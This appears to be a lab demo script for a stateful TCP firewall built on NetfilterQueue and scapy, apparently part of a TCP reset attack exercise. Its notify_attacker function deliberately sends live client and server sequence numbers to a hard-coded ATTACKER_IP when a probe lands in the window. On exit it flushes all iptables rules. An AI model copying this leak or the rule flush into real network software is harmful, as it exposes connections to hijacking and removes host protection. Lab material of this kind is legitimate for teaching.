#!/usr/bin/env python3
"""
Stateful Firewall — Reset-the-Server Demo (Simple)
====================================================
Validates packets against TCP window.
When attacker probe (ack=0) hits the window, sends both
client_seq and server_seq back to the attacker.
"""

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, send as scapy_send, Raw

connections = {}
WINDOW_SIZE = 65535
ATTACKER_IP = "30.0.0.30"
NOTIFY_PORT = 9999
notified = False

print("=" * 50)
print("  Stateful TCP Firewall")
print("=" * 50)


def seq_in_window(seq, expected, win):
    end = (expected + win) & 0xFFFFFFFF
    if expected <= end:
        return expected <= seq <= end
    else:
        return seq >= expected or seq <= end


def notify_attacker(client_seq, server_seq):
    pkt = (IP(dst=ATTACKER_IP)
           / TCP(sport=NOTIFY_PORT, dport=NOTIFY_PORT,
                 seq=client_seq, ack=server_seq, flags="PA")
           / Raw(load=b"FOUND"))
    for _ in range(3):
        scapy_send(pkt, verbose=False)


def process(packet):
    global notified
    ip = IP(packet.get_payload())
    if TCP not in ip:
        packet.accept()
        return

    tcp = ip[TCP]
    flags = tcp.sprintf("%TCP.flags%")

    if flags == "S":
        key = (ip.src, ip.dst, tcp.sport, tcp.dport)
        connections[key] = {"state": "SYN_SENT",
                            "client_seq": tcp.seq + 1, "server_seq": 0}
        print(f"[+] SYN  {key}")
        packet.accept()
        return

    if flags == "SA":
        key = (ip.dst, ip.src, tcp.dport, tcp.sport)
        if key in connections:
            connections[key]["state"] = "SYN_RECEIVED"
            connections[key]["server_seq"] = tcp.seq + 1
            print(f"[+] SYN-ACK  server_seq={tcp.seq + 1}")
        packet.accept()
        return

    if "R" in flags:
        packet.accept()
        return

    key = (ip.src, ip.dst, tcp.sport, tcp.dport)
    rev = (ip.dst, ip.src, tcp.dport, tcp.sport)
    conn_key = key if key in connections else (rev if rev in connections else None)

    if not conn_key:
        packet.drop()
        return

    conn = connections[conn_key]

    if conn["state"] in ("SYN_SENT", "SYN_RECEIVED") and flags == "A":
        conn["state"] = "ESTABLISHED"
        print(f"[+] ESTABLISHED  client_seq={conn['client_seq']}  "
              f"server_seq={conn['server_seq']}")
        packet.accept()
        return

    if conn["state"] == "ESTABLISHED":
        expected = conn["client_seq"] if key == conn_key else conn["server_seq"]

        if not seq_in_window(tcp.seq, expected, WINDOW_SIZE):
            packet.drop()
            return

        # Attacker probe: ack=0 and in-window
        if tcp.ack == 0 and not notified:
            c, s = conn["client_seq"], conn["server_seq"]
            print(f"\n[!] PROBE HIT  client_seq={c}  server_seq={s}")
            print(f"[!] Notifying attacker...")
            notify_attacker(c, s)
            notified = True
            packet.drop()
            return

        if "P" in flags:
            plen = len(bytes(tcp.payload))
            if plen > 0:
                if key == conn_key:
                    conn["client_seq"] = (tcp.seq + plen) & 0xFFFFFFFF
                else:
                    conn["server_seq"] = (tcp.seq + plen) & 0xFFFFFFFF

        packet.accept()
        return

    packet.accept()


if __name__ == "__main__":
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, process)
    print("Firewall running on NFQUEUE 0\n")
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\nStopping...")
    finally:
        try: nfqueue.unbind()
        except: pass
        import os; os.system("iptables -F")
        print("[*] iptables flushed")
